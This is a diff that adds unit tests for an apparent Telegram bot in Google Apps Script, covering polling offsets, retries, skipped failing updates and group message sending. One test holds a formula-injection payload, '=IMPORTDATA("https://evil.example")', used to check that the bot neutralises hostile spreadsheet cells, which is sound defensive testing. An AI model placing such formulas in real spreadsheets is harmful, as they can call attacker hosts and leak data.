@@ -56,3 +56,73 @@ test('uses polling not webhook endpoint',()=>{
  assert.match(source,/deleteWebhook/);
  assert.doesNotMatch(source,/function doPost\(/);
 });
+
+test('RSS spreadsheet formula injection is neutralized',()=>{
+ assert.equal(ctx.botSafeCell_('=IMPORTDATA("https://evil.example")'), '\u200b=IMPORTDATA("https://evil.example")');
+ assert.equal(ctx.botSafeCell_('+SUM(1,2)'), '\u200b+SUM(1,2)');
+ assert.equal(ctx.botSafeCell_('Normal haber'), 'Normal haber');
+});
+test('pollTelegram drains a bounded backlog and advances the offset',()=>{
+ values.set('TELEGRAM_BOT_TOKEN','test-only');
+ values.delete('NEXT_UPDATE_ID');
+ const seen=[];
+ let calls=0;
+ ctx.botApi_=(method,options)=>{
+  assert.equal(method,'getUpdates');
+  calls++;
+  const start=options.offset||100;
+  const remaining=145-start;
+  return Array.from({length:Math.max(0,Math.min(options.limit,remaining))},(_,i)=>({update_id:start+i}));
+ };
+ ctx.botUpdate_=(entry)=>seen.push(entry.update_id);
+ ctx.botLogError_=()=>{};
+ ctx.botMetric_=()=>{};
+ ctx.pollTelegram();
+ assert.equal(calls,2);
+ assert.equal(seen.length,45);
+ assert.equal(values.get('NEXT_UPDATE_ID'),'145');
+});
+test('transient failed update is retried without losing its offset',()=>{
+ values.set('NEXT_UPDATE_ID','800');
+ values.delete('RETRY_800');
+ let attempts=0;
+ ctx.botApi_=()=>[{update_id:800}];
+ ctx.botUpdate_=()=>{if(attempts++===0)throw Error('temporary');};
+ ctx.pollTelegram();
+ assert.equal(values.get('NEXT_UPDATE_ID'),'800');
+ assert.equal(values.get('RETRY_800'),'1');
+ ctx.pollTelegram();
+ assert.equal(values.get('NEXT_UPDATE_ID'),'801');
+ assert.equal(values.has('RETRY_800'),false);
+});
+test('poison update is skipped after three failed polling runs',()=>{
+ values.set('NEXT_UPDATE_ID','901');
+ values.delete('RETRY_901');
+ ctx.botApi_=()=>[{update_id:901}];
+ ctx.botUpdate_=()=>{throw Error('bad update');};
+ ctx.pollTelegram();
+ ctx.pollTelegram();
+ assert.equal(values.get('NEXT_UPDATE_ID'),'901');
+ ctx.pollTelegram();
+ assert.equal(values.get('NEXT_UPDATE_ID'),'902');
+ assert.equal(values.has('RETRY_901'),false);
+});
+test('successful group send survives failed admin confirmation without duplicate retry',()=>{
+ const statuses=[], sent=[];
+ ctx.botEnabled_=flag=>flag==='PUBLISH';
+ ctx.botConfig_=key=>key==='TELEGRAM_GROUP_ID'?'-100123':'';
+ ctx.botDigestById_=()=>({row:2,status:'pending',body:'hello'});
+ ctx.botSheet_=()=>({getRange:()=>({setValue:v=>statuses.push(v)})});
+ ctx.botRows_=()=>[];
+ ctx.botSend_=(target,body)=>{
+  sent.push(String(target));
+  if(String(target)==='42')throw Error('admin blocked');
+ };
+ ctx.botMetric_=()=>{};
+ ctx.botLogError_=()=>{};
+ ctx.botPublish_('42','10');
+ assert.ok(statuses.includes('sending'));
+ assert.ok(statuses.includes('sent'));
+ assert.ok(!statuses.includes('needs_review'));
+ assert.equal(sent.filter(x=>x==='-100123').length,1);
+});
